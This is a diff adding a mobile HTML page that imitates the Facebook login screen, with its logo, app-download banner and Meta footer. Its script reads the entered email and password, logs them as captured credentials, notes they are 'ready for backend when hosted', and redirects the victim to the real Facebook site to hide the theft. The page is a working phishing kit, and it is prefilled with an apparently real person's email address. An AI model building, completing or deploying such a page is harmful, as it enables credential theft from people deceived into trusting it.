@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Facebook</title>
+  <style>
+    * { box-sizing: border-box; margin:0; padding:0; }
+    body {
+      font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 10px 15px 20px;
+      color: #050505;
+    }
+    .top-ad {
+      width: 100%;
+      text-align: center;
+      color: #1877f2;
+      font-size: 14px;
+      padding: 8px 0;
+      border-bottom: 1px solid #ddd;
+    }
+    .logo {
+      width: 80px;
+      height: 80px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 65px;
+      font-weight: 700;
+      border-radius: 9999px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 40px 0 50px;
+      box-shadow: 0 4px 12px rgba(24,119,242,0.3);
+    }
+    .inputs {
+      width: 100%;
+      max-width: 380px;
+    }
+    input {
+      width: 100%;
+      padding: 16px 14px;
+      margin: 8px 0;
+      border: 1px solid #ced0d4;
+      border-radius: 10px;
+      font-size: 17px;
+      background: #fff;
+    }
+    input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+    }
+    .login-btn {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      padding: 13px;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: 600;
+      margin: 15px 0 10px;
+    }
+    .forgot {
+      color: #1877f2;
+      text-align: center;
+      font-size: 15px;
+      text-decoration: none;
+      display: block;
+      margin: 15px 0;
+    }
+    .create-btn {
+      width: 100%;
+      background: #fff;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      padding: 13px;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: 600;
+    }
+    .meta {
+      margin-top: auto;
+      padding: 40px 0 10px;
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="top-ad">↓ Get Facebook for Android and browse faster.</div>
+  
+  <div class="logo">f</div>
+  
+  <div class="inputs">
+    <input type="text" placeholder="Mobile number or email" value="dalechrisarthurs@gmail.com">
+    <input type="password" placeholder="Password" value="••••••••">
+    <button class="login-btn" onclick="captureCreds()">Log in</button>
+    <a href="#" class="forgot">Forgot password?</a>
+    <button class="create-btn">Create new account</button>
+  </div>
+  
+  <div class="meta">Meta</div>
+
+  <script>
+    function captureCreds() {
+      const email = document.querySelector('input[type="text"]').value;
+      const pass = document.querySelector('input[type="password"]').value;
+      console.log('Captured creds (mobile-optimized):', email, pass);
+      alert('Login info saved — ready for backend when hosted!');
+      window.location = 'https://m.facebook.com'; // redirect to real site
+    }
+  </script>
+</body>
+</html>
